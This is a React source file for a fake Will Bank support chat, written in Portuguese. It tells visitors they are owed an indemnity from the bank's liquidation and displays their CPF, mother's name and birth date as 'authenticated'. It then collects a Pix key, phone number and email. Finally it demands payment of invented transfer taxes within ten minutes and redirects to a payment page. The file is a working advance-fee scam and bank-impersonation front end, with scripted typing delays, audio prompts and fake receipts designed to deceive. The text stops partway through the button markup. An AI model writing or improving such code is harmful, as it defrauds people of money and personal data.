import { useEffect, useState, useRef, forwardRef } from "react";
import { useNavigate, useLocation } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { CheckCircle2, Play, Pause, Check, ArrowLeft, MoreVertical, Phone, Send, Mic, Paperclip, Smile, Shield, Clock, Mail, Smartphone, X } from "lucide-react";
import { CPFData } from "@/lib/cpf";
import willbankLogo from "@/assets/willbank-logo.png";
import {
  Dialog,
  DialogContent,
  DialogHeader,
  DialogTitle,
} from "@/components/ui/dialog";
import { saveSession, getSession } from "@/hooks/useSessionPersistence";

type ChatStep = "waiting-video" | "greeting" | "quiz-mae" | "quiz-nascimento" | "identity-confirmed" | "audio-1-validation" | "waiting-confirm-validation" | "show-approval-animation" | "audio-3-approval" | "pix-type-selection" | "pix-cpf-input" | "pix-email-input" | "pix-confirm" | "audio-2-comprovante" | "generating-comprovante" | "envio-selection" | "sms-input" | "email-input" | "audio-1-taxas" | "taxa-info" | "processing" | "final";
interface QuizOption {
  text: string;
  isCorrect: boolean;
}
interface Message {
  id: number;
  type: 'bot' | 'user' | 'system' | 'audio' | 'error';
  content: React.ReactNode;
  time: string;
  audioSrc?: string;
}
const Chat = () => {
  const navigate = useNavigate();
  const location = useLocation();
  const [step, setStep] = useState<ChatStep>("waiting-video");
  const [messages, setMessages] = useState<Message[]>([]);
  const [showVideo, setShowVideo] = useState(false);
  const [videoPlaying, setVideoPlaying] = useState(false);
  const [quizOptions, setQuizOptions] = useState<QuizOption[]>([]);
  const [pixKeyInput, setPixKeyInput] = useState("");
  const [phoneNumber, setPhoneNumber] = useState("");
  const [emailInput, setEmailInput] = useState("");
  const [showPixInput, setShowPixInput] = useState(false);
  const [showPhoneInput, setShowPhoneInput] = useState(false);
  const [showEmailInput, setShowEmailInput] = useState(false);
  const [isTyping, setIsTyping] = useState(false);
  const [currentAudio, setCurrentAudio] = useState<HTMLAudioElement | null>(null);
  const [playingAudioId, setPlayingAudioId] = useState<number | null>(null);
  const [selectedPixType, setSelectedPixType] = useState<"telefone" | "cpf" | "email" | null>(null);
  const [audioListened, setAudioListened] = useState<Set<string>>(new Set());
  const [waitingForAudio, setWaitingForAudio] = useState<string | null>(null);
  
  // Dialog states for popups
  const [pixDialogOpen, setPixDialogOpen] = useState(false);
  const [comprovanteDialogOpen, setComprovanteDialogOpen] = useState(false);
  const [dialogType, setDialogType] = useState<"telefone" | "email" | "sms" | null>(null);

  // Enforce audio play order in the chat UI (audio-1 first, then audio-2, then audio-3)
  const audioOrder = ["/audio/audio-1.mp3", "/audio/audio-2.mp3", "/audio/audio-3.mp3"] as const;
  const nextRequiredAudio = audioOrder.find(src => !audioListened.has(src)) ?? null;
  const messagesEndRef = useRef<HTMLDivElement>(null);
  const videoRef = useRef<HTMLVideoElement>(null);
  
  // Try to get cpfData from location state or session
  const cpfData: CPFData | undefined = location.state?.cpfData || getSession()?.cpfData;
  const [valorBeneficio] = useState(() => {
    const baseValue = Math.floor(Math.random() * (9500 - 1500 + 1) + 1500);
    const cents = Math.floor(Math.random() * 100);
    return baseValue + cents / 100;
  });
  const [protocolo] = useState(() => {
    return `202${Date.now().toString().slice(-13)}`;
  });
  const getCurrentTime = () => {
    return new Date().toLocaleTimeString('pt-BR', {
      hour: '2-digit',
      minute: '2-digit'
    });
  };
  const scrollToBottom = () => {
    messagesEndRef.current?.scrollIntoView({
      behavior: "smooth"
    });
  };
  useEffect(() => {
    scrollToBottom();
  }, [messages, step, isTyping]);
  useEffect(() => {
    if (!cpfData) {
      navigate("/");
      return;
    }
    // Save session
    saveSession({ cpfData, currentStep: "/chat" });
    // Start with video immediately
    setShowVideo(true);
    setStep("waiting-video");
  }, [cpfData, navigate]);
  const delay = (ms: number) => new Promise(resolve => setTimeout(resolve, ms));

  // Realistic typing delays
  const getTypingDelay = (messageLength: number) => {
    const baseDelay = 1500;
    const perCharDelay = 25;
    return Math.min(baseDelay + messageLength * perCharDelay, 4000);
  };
  const addBotMessage = async (content: React.ReactNode, showTyping = true, messageLength = 50) => {
    if (showTyping) {
      setIsTyping(true);
      await delay(getTypingDelay(messageLength));
      setIsTyping(false);
    }
    const newMessage: Message = {
      id: Date.now() + Math.random(),
      type: 'bot',
      content,
      time: getCurrentTime()
    };
    setMessages(prev => [...prev, newMessage]);
    await delay(800);
  };
  const addAudioMessage = async (audioSrc: string, showTyping = true) => {
    if (showTyping) {
      setIsTyping(true);
      await delay(2000);
      setIsTyping(false);
    }
    const newMessage: Message = {
      id: Date.now() + Math.random(),
      type: 'audio',
      content: null,
      time: getCurrentTime(),
      audioSrc
    };
    setMessages(prev => [...prev, newMessage]);
    await delay(500);
  };
  const addUserMessage = (content: React.ReactNode) => {
    const newMessage: Message = {
      id: Date.now() + Math.random(),
      type: 'user',
      content,
      time: getCurrentTime()
    };
    setMessages(prev => [...prev, newMessage]);
  };
  const addErrorMessage = async () => {
    const newMessage: Message = {
      id: Date.now() + Math.random(),
      type: 'error',
      content: <div className="flex flex-col items-center text-center space-y-4 p-4">
          <div className="w-20 h-20 bg-red-500 rounded-full flex items-center justify-center">
            <X className="w-12 h-12 text-white" strokeWidth={3} />
          </div>
          <p className="text-lg">
            A opção selecionada <strong>não é compatível</strong> com o nome registrado na <strong>Receita Federal</strong>.
          </p>
        </div>,
      time: getCurrentTime()
    };
    setMessages(prev => [...prev, newMessage]);
    await delay(1500);
  };
  const generateFakeOptions = (correctAnswer: string, type: "mae" | "nascimento"): QuizOption[] => {
    const fakeNames = ["MARIA SANTOS OLIVEIRA", "ANA PAULA FERREIRA", "CLAUDIA SOUZA LIMA", "PATRICIA GOMES SILVA"];
    const fakeDates = ["15/03/1998", "22/07/1995", "08/12/2001", "30/05/1999"];
    
    // Check if mother's name is not available
    const isMotherNameUnavailable = type === "mae" && 
      (!correctAnswer || correctAnswer === "Não disponível" || correctAnswer.trim() === "");
    
    if (type === "mae") {
      const shuffled = fakeNames.filter(o => o !== correctAnswer).sort(() => Math.random() - 0.5).slice(0, 2);
      
      // Always add "Não identificada" option
      const naoIdentificada = "NÃO IDENTIFICADA";
      shuffled.push(naoIdentificada);
      
      // Add correct answer if available
      if (!isMotherNameUnavailable) {
        shuffled.push(correctAnswer);
      }
      
      return shuffled.sort(() => Math.random() - 0.5).map(text => ({
        text,
        // "NÃO IDENTIFICADA" is correct when mother name is unavailable, otherwise the actual name is correct
        isCorrect: isMotherNameUnavailable ? text === naoIdentificada : text === correctAnswer
      }));
    } else {
      const shuffled = fakeDates.filter(o => o !== correctAnswer).sort(() => Math.random() - 0.5).slice(0, 3);
      shuffled.push(correctAnswer);
      return shuffled.sort(() => Math.random() - 0.5).map(text => ({
        text,
        isCorrect: text === correctAnswer
      }));
    }
  };
  const handleVideoEnd = async () => {
    setVideoPlaying(false);
    setShowVideo(false);
    await delay(1500);
    await addBotMessage(<span>Olá <strong>{cpfData?.nome}</strong>, Seja muito bem vindo ao <strong>Setor de Atendimento online</strong> do Will Bank.</span>, true, 80);
    await delay(1200);
    await addBotMessage(<span>O número do <strong>PROTOCOLO</strong> deste atendimento é: <span className="font-mono bg-primary/20 px-2 py-0.5 rounded text-sm">{protocolo}</span></span>, true, 50);
    await delay(1500);
    await addBotMessage(<div className="space-y-2">
        <span>Você está a um passo de validar sua <strong>indenização referente à liquidação do Will Bank</strong>, no valor de:</span>
        <div className="mt-2 p-3 bg-green-50 border border-green-200 rounded-xl">
          <span className="text-green-700 font-bold text-xl">R$ {valorBeneficio.toLocaleString('pt-BR', {
            minimumFractionDigits: 2
          })}</span>
        </div>
      </div>, true, 100);
    await delay(2000);
    await addBotMessage(<span>Responda as perguntas a seguir para a <strong>aprovação da sua indenização</strong>.</span>, true, 55);
    await delay(1500);
    await addBotMessage(<span><strong>Qual o nome da sua mãe?</strong></span>, true, 25);
    await delay(500);
    await addBotMessage(<span className="text-muted-foreground text-sm">Escolha a alternativa correta.</span>, false);
    setQuizOptions(generateFakeOptions(cpfData?.nomeMae || "", "mae"));
    setStep("quiz-mae");
  };
  const handleVideoClick = () => {
    if (videoRef.current) {
      if (videoPlaying) {
        videoRef.current.pause();
        setVideoPlaying(false);
      } else {
        videoRef.current.play();
        setVideoPlaying(true);
      }
    }
  };
  const handleQuizAnswer = async (option: QuizOption, quizType: "mae" | "nascimento") => {
    const currentQuizType = quizType;
    addUserMessage(<span>{option.text}</span>);
    setQuizOptions([]);
    await delay(500);
    if (option.isCorrect) {
      await addBotMessage(<span className="flex items-center gap-2 text-green-600">
          <CheckCircle2 className="w-4 h-4" />
          Resposta correta! ✅
        </span>, true, 20);
      if (currentQuizType === "mae") {
        await delay(1000);
        await addBotMessage(<span>Próxima pergunta...</span>, true, 20);
        await delay(1000);
        await addBotMessage(<span><strong>Qual sua data de nascimento?</strong></span>, true, 30);
        await delay(500);
        await addBotMessage(<span className="text-muted-foreground text-sm">Escolha a alternativa correta.</span>, false);
        const newOptions = generateFakeOptions(cpfData?.dataNascimento || "", "nascimento");
        setStep("quiz-nascimento");
        await delay(100);
        setQuizOptions(newOptions);
      } else {
        await delay(1000);
        await addBotMessage(<div className="bg-green-50 border border-green-200 rounded-xl p-4">
            <span className="flex items-center gap-2 text-green-700 font-semibold">
              <Shield className="w-5 h-5" />
              Identidade confirmada com sucesso!
            </span>
          </div>, true, 35);
        setStep("identity-confirmed");
        await showAutenticidadeCertificado();
      }
    } else {
      // Show error image
      await addErrorMessage();
      await addBotMessage(<span>Tente novamente:</span>, true, 20);
      await delay(300);
      const retryOptions = generateFakeOptions(currentQuizType === "mae" ? cpfData?.nomeMae || "" : cpfData?.dataNascimento || "", currentQuizType);
      setQuizOptions(retryOptions);
    }
  };
  const playAudio = (audioSrc: string, messageId: number) => {
    if (currentAudio) {
      currentAudio.pause();
      currentAudio.currentTime = 0;
    }
    if (playingAudioId === messageId) {
      setPlayingAudioId(null);
      setCurrentAudio(null);
      return;
    }
    const audio = new Audio(audioSrc);
    audio.play();
    setCurrentAudio(audio);
    setPlayingAudioId(messageId);
    audio.onended = () => {
      setPlayingAudioId(null);
      setCurrentAudio(null);
      setAudioListened(prev => new Set(prev).add(audioSrc));
      if (waitingForAudio === audioSrc) {
        setWaitingForAudio(null);
      }
    };
  };
  const showAutenticidadeCertificado = async () => {
    await delay(2000);

    // Certificado de Autenticidade
    await addBotMessage(<div className="bg-card border-2 border-primary/30 rounded-2xl p-5 space-y-4 shadow-lg">
        <div className="flex justify-center">
          <img src={willbankLogo} alt="Will Bank" className="h-10" />
        </div>
        <h3 className="text-lg font-bold text-center italic text-primary-foreground bg-primary">Confirmação de Autenticidade</h3>
        
        <div className="bg-gradient-to-r from-primary to-amber-400 text-primary-foreground text-center py-2 rounded-full text-sm font-bold">
          Dados Autenticados
        </div>
        
        <p className="text-center text-sm text-muted-foreground">
          Os dados do(a) Sr(a). <strong className="text-foreground">{cpfData?.nome}</strong> foram encontrados em nosso sistema e sua autenticidade foi confirmada.
        </p>

        <div className="divide-y border rounded-xl overflow-hidden bg-muted/30">
          <DataRow label="Nome Completo" value={cpfData?.nome || ""} />
          <DataRow label="CPF" value={cpfData?.cpf || ""} />
          <DataRow label="Data de Nascimento" value={cpfData?.dataNascimento || ""} />
          <DataRow label="Nome da Mãe" value={cpfData?.nomeMae || ""} />
          <DataRow label="Cidade/Estado" value="Brasil" />
          <DataRow label="Data e Hora da Consulta" value={new Date().toLocaleString('pt-BR')} />
          <DataRow label="Protocolo" value={protocolo} />
        </div>
      </div>, false);
    await delay(2500);

    // Audio 1 - Validação (primeiro áudio após o certificado)
    await addAudioMessage("/audio/audio-1.mp3");
    await delay(1000);
    await addBotMessage(<span>Ouça o áudio acima e clique no botão para <strong>confirmar sua validação</strong>.</span>, true, 50);
    setWaitingForAudio("/audio/audio-1.mp3");
    setStep("audio-1-validation");
  };
  const handleConfirmValidation = async () => {
    addUserMessage(<span>✓ CONFIRMAR VALIDAÇÃO</span>);
    setStep("processing");
    await delay(1500);

    // Approval Animation Card (agora aparece depois do botão de confirmação)
    await addBotMessage(<ApprovalAnimation value={valorBeneficio} name={cpfData?.nome || ""} />, false);
    await delay(3500);
    await addBotMessage(<span className="flex items-center gap-2 text-green-600 text-lg font-bold">
        <CheckCircle2 className="w-6 h-6" />
        Sua indenização foi aprovada! ✅
      </span>, true, 30);
    await delay(1500);
    await addBotMessage(<span>Escolha abaixo o tipo de <strong>Chave Pix</strong> que você deseja receber a sua quantia.</span>, true, 60);
    setStep("pix-type-selection");
  };
  const handlePixTypeTelefone = async () => {
    addUserMessage(<span>📱 Telefone</span>);
    setSelectedPixType("telefone");
    setStep("processing");
    await delay(1500);
    await addBotMessage(<span>Insira sua <strong>chave pix</strong> (telefone):</span>, true, 40);
    setStep("pix-cpf-input");
    setDialogType("telefone");
    setPixDialogOpen(true);
  };
  const handlePixTypeCPF = async () => {
    addUserMessage(<span>📋 CPF</span>);
    setSelectedPixType("cpf");
    setPixKeyInput(cpfData?.cpf || "");
    setStep("processing");
    await delay(1500);
    await addBotMessage(<div className="bg-amber-50 border border-amber-300 rounded-xl p-4 space-y-3">
        <p className="font-bold text-red-600 flex items-center gap-2">
          ⚠️ ATENÇÃO, {cpfData?.nome?.split(' ')[0]}!
        </p>
        <p className="text-sm text-primary-foreground">Confira os dados inseridos para garantir que o valor será transferido corretamente:</p>
        <div className="bg-white rounded-lg p-3 border space-y-1 text-foreground">
          <p className="text-foreground"><strong>Nome:</strong> {cpfData?.nome}</p>
          <p className="text-foreground"><strong>Chave Pix:</strong> {cpfData?.cpf}</p>
        </div>
        <p className="text-xs text-muted-foreground">Se houver algum erro, o pagamento não será concluído. A WillBank não se responsabiliza em casos de transferências em chave pix erradas.</p>
      </div>, true, 80);
    setStep("pix-confirm");
  };
  const handlePixTypeEmail = async () => {
    addUserMessage(<span>📧 E-mail</span>);
    setSelectedPixType("email");
    setStep("processing");
    await delay(1500);
    await addBotMessage(<span>Insira sua <strong>chave pix</strong> (e-mail):</span>, true, 40);
    setStep("pix-email-input");
    setDialogType("email");
    setPixDialogOpen(true);
  };
  const handlePixKeySubmit = async () => {
    if (!pixKeyInput.trim()) return;
    setPixDialogOpen(false);
    addUserMessage(<span>{pixKeyInput}</span>);
    setStep("processing");
    await delay(1500);
    await addBotMessage(<div className="bg-amber-50 border border-amber-300 rounded-xl p-4 space-y-3">
        <p className="font-bold text-red-600 flex items-center gap-2">
          ⚠️ ATENÇÃO, {cpfData?.nome?.split(' ')[0]}!
        </p>
        <p className="text-sm text-primary-foreground">Confira os dados inseridos para garantir que o valor será transferido corretamente:</p>
        <div className="bg-white rounded-lg p-3 border space-y-1 text-foreground">
          <p className="text-foreground"><strong>Nome:</strong> {cpfData?.nome}</p>
          <p className="text-foreground"><strong>Chave Pix:</strong> {pixKeyInput}</p>
        </div>
        <p className="text-xs text-muted-foreground">Se houver algum erro, o pagamento não será concluído. A WillBank não se responsabiliza em casos de transferências em chave pix erradas.</p>
      </div>, true, 80);
    setStep("pix-confirm");
  };
  const handleConfirmPix = async () => {
    addUserMessage(<span>Sim, está correto ✓</span>);
    setStep("processing");
    await delay(1000);
    await addBotMessage(<span>Aguarde um momento!</span>, true, 20);
    await delay(1500);
    await addBotMessage(<span className="text-primary">Finalizando o cadastro da sua chave pix...</span>, true, 40);
    await delay(2000);
    await addBotMessage(<span className="flex items-center gap-2 text-green-600">
        <CheckCircle2 className="w-4 h-4" />
        Sua chave pix foi cadastrada com sucesso!
      </span>, true, 35);
    await delay(2000);

    // Audio 2 - Comprovante (segundo áudio após confirmar PIX)
    await addAudioMessage("/audio/audio-2.mp3");
    await delay(1000);
    await addBotMessage(<span>Clique no botão abaixo para <strong>confirmar seu processo indenizatório</strong> e gerar seu comprovante de recebimento.</span>, true, 70);
    setWaitingForAudio("/audio/audio-2.mp3");
    setStep("audio-2-comprovante");
  };
  const handleGenerateComprovante = async () => {
    addUserMessage(<span>CONFIRMAR</span>);
    setStep("processing");
    await delay(1500);
    await addBotMessage(<span className="text-primary flex items-center gap-2"><Clock className="w-4 h-4 animate-spin" /> Gerando seu comprovante de recebimento dos valores...</span>, true, 50);
    await delay(2500);
    await addBotMessage(<span className="flex items-center gap-2 text-green-600">
        <CheckCircle2 className="w-4 h-4" />
        Seu Comprovante Indenizatório foi gerado com sucesso!
      </span>, true, 45);
    await delay(1500);
    const pixKey = selectedPixType === "cpf" ? cpfData?.cpf : pixKeyInput;
    const vencimento = new Date();
    vencimento.setMinutes(vencimento.getMinutes() + 10);
    const ipct = valorBeneficio * 0.0021;
    const ipti = valorBeneficio * 0.0025;
    const ipri = valorBeneficio * 0.0025;
    const totalImposto = ipct + ipti + ipri;

    // Comprovante Indenizatório
    await addBotMessage(<div className="bg-card border-2 border-primary/30 rounded-2xl p-5 space-y-4 shadow-lg text-foreground">
        <h3 className="text-lg font-bold text-center italic border-b pb-3">Comprovante Indenizatório</h3>
        
        <div className="bg-muted border-l-4 border-primary p-3 text-sm text-foreground">
          <p>
            O Will Bank, com base no processo indenizatório do Sr. (a) <strong>{cpfData?.nome}</strong>, portador do CPF{' '}
            <strong className="text-primary">{cpfData?.cpf}</strong>,{' '}
            <span className="text-primary font-semibold">confirma o direito à indenização por possuir cadastro no Will Bank</span>.
          </p>
        </div>

        <div className="divide-y border rounded-xl overflow-hidden">
          <DataRow label="Indenização a receber" value={`R$ ${valorBeneficio.toLocaleString('pt-BR', {
          minimumFractionDigits: 2
        })}`} highlight />
          <DataRow label="Protocolo" value={protocolo} />
          <DataRow label="Data e Hora de Emissão" value={new Date().toLocaleString('pt-BR')} />
          <DataRow label="Vencimento" value={vencimento.toLocaleString('pt-BR')} />
          <DataRow label="Imposto de Recebimento" value={`R$ ${totalImposto.toFixed(2).replace('.', ',')}`} />
        </div>
      </div>, false);
    await delay(2500);
    await addBotMessage(<span>O setor de Indenização da WillBank confirma que seu processo indenizatório foi registrado com sucesso e vinculado ao seu CPF <strong>{cpfData?.cpf}</strong>.</span>, true, 100);
    await delay(1500);
    await addBotMessage(<span><strong>IMPORTANTE:</strong> Escolha como deseja receber uma cópia do seu Comprovante Indenizatório.</span>, true, 60);
    setStep("envio-selection");
  };
  const handleSMSOption = async () => {
    addUserMessage(<span>📱 Receber por SMS</span>);
    setStep("processing");
    await delay(1500);
    await addBotMessage(<span>Digite seu número de celular:</span>, true, 30);
    setStep("sms-input");
    setDialogType("sms");
    setComprovanteDialogOpen(true);
  };
  const handleEmailOption = async () => {
    addUserMessage(<span>📧 Receber por E-mail</span>);
    setStep("processing");
    await delay(1500);
    await addBotMessage(<span>Digite seu e-mail:</span>, true, 20);
    setStep("email-input");
    setDialogType("email");
    setComprovanteDialogOpen(true);
  };
  const handlePhoneSubmit = async () => {
    if (!phoneNumber.trim()) return;
    setComprovanteDialogOpen(false);
    addUserMessage(<span>{phoneNumber}</span>);
    setStep("processing");
    await delay(2000);
    await addBotMessage(<div className="space-y-2">
        <span className="flex items-center gap-2 text-green-600">
          <CheckCircle2 className="w-4 h-4" />
          Seu comprovante foi salvo!
        </span>
        <p className="text-sm">Você irá receber uma cópia em <strong>{phoneNumber}</strong>.</p>
        <p className="text-xs text-amber-600">⏰ Você receberá em até 24 horas.</p>
      </div>, true, 40);
    await showTaxaInfo();
  };
  const handleEnvioEmailSubmit = async () => {
    if (!emailInput.trim()) return;
    setComprovanteDialogOpen(false);
    addUserMessage(<span>{emailInput}</span>);
    setStep("processing");
    await delay(2000);
    await addBotMessage(<div className="space-y-2">
        <span className="flex items-center gap-2 text-green-600">
          <CheckCircle2 className="w-4 h-4" />
          Seu comprovante foi salvo!
        </span>
        <p className="text-sm">Você irá receber uma cópia em <strong>{emailInput}</strong>.</p>
        <p className="text-xs text-amber-600">⏰ Você receberá em até 24 horas.</p>
      </div>, true, 40);
    await showTaxaInfo();
  };
  const showTaxaInfo = async () => {
    await delay(2500);
    await addBotMessage(<div className="bg-card border border-border rounded-xl p-4 space-y-3 text-foreground">
        <p className="font-bold text-destructive">⚠️ ATENÇÃO:</p>
        <p className="text-sm text-foreground">A WillBank já iniciou o repasse da sua indenização de <strong className="text-primary">R$ {valorBeneficio.toLocaleString('pt-BR', {
            minimumFractionDigits: 2
          })}</strong></p>
        <p className="text-sm text-foreground">Para liberar o seu valor é necessário realizar o pagamento do <strong>Imposto de Transferência</strong> em até <strong className="text-destructive">10 minutos</strong>.</p>
      </div>, true, 100);
    await delay(2000);
    await addBotMessage(<span>Clique abaixo para entender o motivo do pagamento desse imposto.</span>, true, 55);
    setStep("taxa-info");
  };
  const handleTaxExplanation = async () => {
    addUserMessage(<span>❓ PORQUE TENHO QUE PAGAR ESSE IMPOSTO?</span>);
    setStep("processing");
    await delay(1500);
    await addBotMessage(<span><strong>IMPORTANTE:</strong> Escute o áudio abaixo com bastante atenção!</span>, true, 50);
    await delay(1000);
    const ipct = valorBeneficio * 0.0021;
    const ipti = valorBeneficio * 0.0025;
    const ipri = valorBeneficio * 0.0025;
    const totalImposto = ipct + ipti + ipri;
    await addBotMessage(<div className="bg-card rounded-xl p-4 space-y-2 text-sm border border-border text-foreground">
        <p className="font-bold text-foreground">📊 Impostos gerados:</p>
        <div className="space-y-1 text-muted-foreground">
          <p>• IPCT (Imposto sobre Circulação de Transferência 0,21%): <strong className="text-foreground">R$ {ipct.toFixed(2).replace('.', ',')}</strong></p>
          <p>• IPTI (Imposto sobre Transferência Indenizatório 0,25%): <strong className="text-foreground">R$ {ipti.toFixed(2).replace('.', ',')}</strong></p>
          <p>• IPRI (Imposto sobre Recebimento Indenizatório 0,25%): <strong className="text-foreground">R$ {ipri.toFixed(2).replace('.', ',')}</strong></p>
        </div>
        <div className="pt-3 border-t border-border mt-3">
          <p className="font-bold text-primary text-base">Valor total do Imposto: R$ {totalImposto.toFixed(2).replace('.', ',')} (0,71% do valor total a receber)</p>
        </div>
      </div>, true, 80);
    await delay(1500);

    // Audio 3 - Taxas (terceiro e último áudio)
    await addAudioMessage("/audio/audio-3.mp3");
    await delay(1500);
    await addBotMessage(<span>Somente após você finalizar o pagamento do Imposto de Recebimento a WillBank terá a autorização de realizar transferências de valor alto diante o monitoramento fiscal.</span>, true, 120);
    setWaitingForAudio("/audio/audio-3.mp3");
    setStep("final");
  };
  const handleFinalPayment = () => {
    const ipct = valorBeneficio * 0.0021;
    const ipti = valorBeneficio * 0.0025;
    const ipri = valorBeneficio * 0.0025;
    const totalImposto = ipct + ipti + ipri;
    navigate("/saque", {
      state: {
        cpfData,
        valorBeneficio,
        valorTaxa: totalImposto,
        protocolo
      }
    });
  };
  if (!cpfData) return null;
  return <div className="min-h-screen min-h-[100dvh] bg-slate-900 flex flex-col">
      {/* Chat Header */}
      <header className="bg-slate-800 text-white px-3 py-2.5 sm:px-4 sm:py-3 flex items-center gap-2.5 border-b border-slate-700 sticky top-0 z-50">
        <button onClick={() => navigate(-1)} className="p-1.5 sm:p-2 hover:bg-slate-700 rounded-full transition-colors">
          <ArrowLeft className="w-5 h-5" />
        </button>
        
        <div className="w-9 h-9 sm:w-11 sm:h-11 rounded-full bg-gradient-to-br from-primary to-amber-400 flex items-center justify-center shadow-lg">
          <img src={willbankLogo} alt="Will Bank" className="w-6 h-6 sm:w-7 sm:h-7 object-contain" />
        </div>
        
        <div className="flex-1 min-w-0">
          <h1 className="font-bold text-sm sm:text-base truncate">Atendimento Will Bank</h1>
          <p className="text-[10px] sm:text-xs text-slate-400 flex items-center gap-1">
            <span className="w-1.5 h-1.5 sm:w-2 sm:h-2 bg-green-500 rounded-full animate-pulse"></span>
            Online agora
          </p>
        </div>

        <button className="p-1.5 sm:p-2 hover:bg-slate-700 rounded-full transition-colors">
          <Phone className="w-4 h-4 sm:w-5 sm:h-5" />
        </button>
        <button className="p-1.5 sm:p-2 hover:bg-slate-700 rounded-full transition-colors">
          <MoreVertical className="w-4 h-4 sm:w-5 sm:h-5" />
        </button>
      </header>

      {/* Messages Area */}
      <main className="flex-1 overflow-y-auto bg-gradient-to-b from-slate-900 to-slate-800 p-3 sm:p-4">
        <div className="max-w-2xl mx-auto space-y-3 sm:space-y-4">
          {/* Date indicator */}
          <div className="text-center">
            <span className="text-[10px] sm:text-xs bg-slate-700/50 text-slate-400 px-2.5 py-0.5 sm:px-3 sm:py-1 rounded-full">
              Hoje
            </span>
          </div>

          {/* Video Section */}
          {showVideo && <div className="mx-auto max-w-[280px] sm:max-w-sm animate-fade-in">
              <div className="text-center mb-2 sm:mb-3">
                <p className="text-white text-xs sm:text-sm">Clique no vídeo abaixo para darmos continuidade 👇</p>
              </div>
              <div className="relative aspect-[9/16] bg-black rounded-xl sm:rounded-2xl overflow-hidden shadow-2xl">
                <video ref={videoRef} src="/video/vsl_1.mp4" className="absolute inset-0 w-full h-full object-cover" playsInline onEnded={handleVideoEnd} onClick={handleVideoClick} />
                
                {!videoPlaying && <div className="absolute inset-0 flex items-center justify-center bg-black/40 cursor-pointer" onClick={handleVideoClick}>
                    <div className="w-16 h-16 sm:w-20 sm:h-20 bg-primary rounded-full flex items-center justify-center shadow-lg hover:scale-110 transition-transform">
                      <Play className="w-8 h-8 sm:w-10 sm:h-10 text-primary-foreground ml-1" fill="currentColor" />
                    </div>
                  </div>}
              </div>
            </div>}

          {/* Messages */}
          {messages.map(message => <div key={message.id} className={`flex ${message.type === 'user' ? 'justify-end' : 'justify-start'} animate-fade-in`}>
              {(message.type === 'bot' || message.type === 'audio') && <div className="w-7 h-7 sm:w-8 sm:h-8 rounded-full bg-gradient-to-br from-primary to-amber-400 flex items-center justify-center shrink-0 mr-1.5 sm:mr-2 shadow-md">
                  <img src={willbankLogo} alt="" className="w-4 h-4 sm:w-5 sm:h-5" />
                </div>}
              
              {message.type === 'error' ? <div className="max-w-[90%] sm:max-w-[85%] bg-white text-slate-800 rounded-xl sm:rounded-2xl shadow-lg px-3 py-2.5 sm:px-4 sm:py-3">
                  {message.content}
                </div> : <div className={`max-w-[90%] sm:max-w-[85%] ${message.type === 'user' ? 'bg-primary text-primary-foreground rounded-xl sm:rounded-2xl rounded-br-sm' : 'bg-slate-700 text-white rounded-xl sm:rounded-2xl rounded-bl-sm shadow-lg'} px-3 py-2 sm:px-4 sm:py-3`}>
                  {message.type === 'audio' ? (() => {
                    const src = message.audioSrc || "";
                    const listened = audioListened.has(src);
                    const disabled = !!nextRequiredAudio && src !== nextRequiredAudio && !listened;
                    return (
                      <AudioPlayerComponent
                        audioSrc={src}
                        isPlaying={playingAudioId === message.id}
                        onPlay={() => {
                          if (disabled) return;
                          playAudio(src, message.id);
                        }}
                        listened={listened}
                        disabled={disabled}
                      />
                    );
                  })() : <div className="text-xs sm:text-sm leading-relaxed">{message.content}</div>}
                  <div className={`text-[9px] sm:text-[10px] mt-1 text-right ${message.type === 'user' ? 'text-primary-foreground/70' : 'text-slate-400'}`}>
                    {message.time}
                  </div>
                </div>}
            </div>)}

          {/* Typing Indicator */}
          {isTyping && <div className="flex justify-start animate-fade-in">
              <div className="w-7 h-7 sm:w-8 sm:h-8 rounded-full bg-gradient-to-br from-primary to-amber-400 flex items-center justify-center shrink-0 mr-1.5 sm:mr-2 shadow-md">
                <img src={willbankLogo} alt="" className="w-4 h-4 sm:w-5 sm:h-5" />
              </div>
              <div className="bg-slate-700 text-white rounded-xl sm:rounded-2xl rounded-bl-sm shadow-lg px-3 py-2.5 sm:px-4 sm:py-3">
                <div className="flex gap-1">
                  <span className="w-2 h-2 bg-slate-400 rounded-full animate-bounce" style={{
                animationDelay: '0ms'
              }}></span>
                  <span className="w-2 h-2 bg-slate-400 rounded-full animate-bounce" style={{
                animationDelay: '150ms'
              }}></span>
                  <span className="w-2 h-2 bg-slate-400 rounded-full animate-bounce" style={{
                animationDelay: '300ms'
              }}></span>
                </div>
              </div>
            </div>}

          {/* Action Buttons */}
          {!showVideo && <div className="flex flex-wrap gap-1.5 sm:gap-2 justify-center py-2 sm:py-3">
              {/* Quiz Options */}
              {step === "quiz-mae" && quizOptions.length > 0 && quizOptions.map((option, index) => <Button key={`mae-${index}-${option.text}`} onClick={() => handleQuizAnswer(option, "mae")} className="bg-slate-700 hover:bg-slate-600 text-white border border-slate-600 rounded-full font-medium shadow-lg text-xs sm:text-sm px-3 py-1.5 h-auto">
                  {option.text}
                </Button>)}
              
              {step === "quiz-nascimento" && quizOptions.length > 0 && quizOptions.map((option, index) => <Button key={`nasc-${index}-${option.text}`} onClick={() => handleQuizAnswer(option, "nascimento")} className="bg-slate-700 hover:bg-slate-600 text-white border border-slate-600 rounded-full font-medium shadow-lg text-xs sm:text-sm px-3 py-1.5 h-auto">
                  {option.text}
                </Button>)}

              {step === "audio-1-validation" && (waitingForAudio === null || audioListened.has("/audio/audio-1.mp3")) && <Button onClick={handleConfirmValidation} className="bg-gradient-to-r from-green-500 to-emerald-500 hover:from-green-600 hover:to-emerald-600 text-white rounded-full font-bold shadow-lg px-5 sm:px-8 text-xs sm:text-sm">
                  ✓ CONFIRMAR VALIDAÇÃO
                </Button>}

              {step === "audio-1-validation" && waitingForAudio === "/audio/audio-1.mp3" && !audioListened.has("/audio/audio-1.mp3") && <p className="text-slate-400 text-xs animate-pulse">🎧 Ouça o áudio acima para continuar...</p>}

              {step === "pix-type-selection" && <div className="flex flex-col gap-1.5 sm:gap-2 w-full max-w-xs">
                  <Button onClick={handlePixTypeTelefone} variant="outline" className="bg-slate-700 hover:bg-slate-600 text-white border-slate-600 rounded-full font-bold shadow-lg px-6 sm:px-8 text-xs sm:text-sm h-10">
                    📱 Telefone
                  </Button>
                  <Button onClick={handlePixTypeCPF} className="bg-gradient-to-r from-primary to-amber-400 text-primary-foreground rounded-full font-bold shadow-lg px-6 sm:px-8 text-xs sm:text-sm h-10">
                    📋 CPF
                  </Button>
